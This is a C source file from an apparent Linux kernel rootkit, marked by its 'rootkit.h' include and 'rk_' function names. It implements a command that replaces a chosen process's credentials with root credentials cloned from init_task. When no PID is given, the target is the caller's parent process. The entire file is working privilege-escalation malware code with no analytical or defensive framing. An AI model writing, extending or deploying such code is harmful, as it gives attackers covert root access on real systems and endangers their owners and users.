// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>

static int rk_escalate_pid(pid_t pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred, *old_real_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	get_task_struct(task);
	rcu_read_unlock();
	if (!task->mm) {
		put_task_struct(task);
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		put_task_struct(task);
		return -ENOMEM;
	}
	task_lock(task);
	old_cred = task->cred;
	old_real_cred = task->real_cred;
	get_cred(new_cred);
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	task_unlock(task);
	put_cred(old_cred);
	put_cred(old_real_cred);
	put_task_struct(task);
	return 0;
}

static int cmd_escalate(const char *arg)
{
	pid_t pid;

	if (!arg)
		return rk_escalate_pid(task_ppid_nr(current));
	if (kstrtoint(arg, 10, &pid) != 0 || pid <= 0)
		return -EINVAL;
	return rk_escalate_pid(pid);
}

int rk_cred_init(void)
{
	return rk_cmd_register("e", cmd_escalate);
}
